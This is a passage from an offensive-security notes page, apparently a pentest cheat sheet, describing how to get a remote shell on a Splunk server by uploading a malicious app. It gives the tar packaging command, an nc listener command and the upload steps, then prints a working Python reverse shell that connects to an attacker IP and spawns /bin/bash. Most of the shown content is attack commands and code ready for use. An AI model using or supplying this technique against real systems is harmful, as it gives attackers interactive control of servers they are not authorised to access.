<span class="normal">2</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-52-1"><span class="nb">cd</span><span class="w"> </span>reverse_shell_splunk
</span><span id="__span-52-2">tar<span class="w"> </span>-cvzf<span class="w"> </span>updater.tar.gz<span class="w"> </span>reverse_shell_splunk/
</span></code></pre></div></td></tr></table></div>
- Start a listener
<div class="language-bash highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">Bash</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-53-1">nc<span class="w"> </span>-nvlp<span class="w"> </span><span class="m">9001</span>
</span></code></pre></div></td></tr></table></div>
- In browser click <code>Apps &gt; Manage Apps(cog symbol) &gt; Install app from file</code>
- <code>Browse</code> to select tar ball then click <code>Upload</code> this will trigger the reverse shell</p>
<p><strong>Linux Hosts</strong>
- Edit <code>rev.py</code> to:
<div class="language-python highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">Python</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span>
<span class="normal">2</span>
<span class="normal">3</span>
<span class="normal">4</span>
<span class="normal">5</span>
<span class="normal">6</span>
<span class="normal">7</span>
<span class="normal">8</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-54-1"><span class="kn">import</span><span class="w"> </span><span class="nn">sys</span><span class="o">,</span><span class="nn">socket</span><span class="o">,</span><span class="nn">os</span><span class="o">,</span><span class="nn">pty</span>
</span><span id="__span-54-2">
</span><span id="__span-54-3"><span class="n">ip</span><span class="o">=</span><span class="s2">&quot;10.10.14.15&quot;</span>
</span><span id="__span-54-4"><span class="n">port</span><span class="o">=</span><span class="s2">&quot;443&quot;</span>
</span><span id="__span-54-5"><span class="n">s</span><span class="o">=</span><span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">()</span>
</span><span id="__span-54-6"><span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="n">ip</span><span class="p">,</span><span class="nb">int</span><span class="p">(</span><span class="n">port</span><span class="p">)))</span>
</span><span id="__span-54-7"><span class="p">[</span><span class="n">os</span><span class="o">.</span><span class="n">dup2</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">fileno</span><span class="p">(),</span><span class="n">fd</span><span class="p">)</span> <span class="k">for</span> <span class="n">fd</span> <span class="ow">in</span> <span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">)]</span>
</span><span id="__span-54-8"><span class="n">pty</span><span class="o">.</span><span class="n">spawn</span><span class="p">(</span><span class="s1">&#39;/bin/bash&#39;</span><span class="p">)</span>
</span></code></pre></div></td></tr></table></div></p>












                
              </article>
            </div>
          
          
<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
        </div>
        
      </main>
      
        <footer class="md-footer">
  
  <div class="md-footer-meta md-typeset">
    <div class="md-footer-meta__inner md-grid">
      <div class="md-copyright">
  
  
    Made with
    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
      Material for MkDocs
    </a>
  
</div>
      
    </div>
  </div>
</footer>
      
    </div>
    <div class="md-dialog" data-md-component="dialog">
      <div class="md-dialog__inner md-typeset"></div>
    </div>
    
    
    
      
      <script id="__config" type="application/json">{"base": "../..", "features": ["content.code.copy"], "search": "../../assets/javascripts/workers/search.d50fe291.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
    
    
      <script src="../../assets/javascripts/bundle.50899def.min.js"></script>
      
    
  </body>
</html>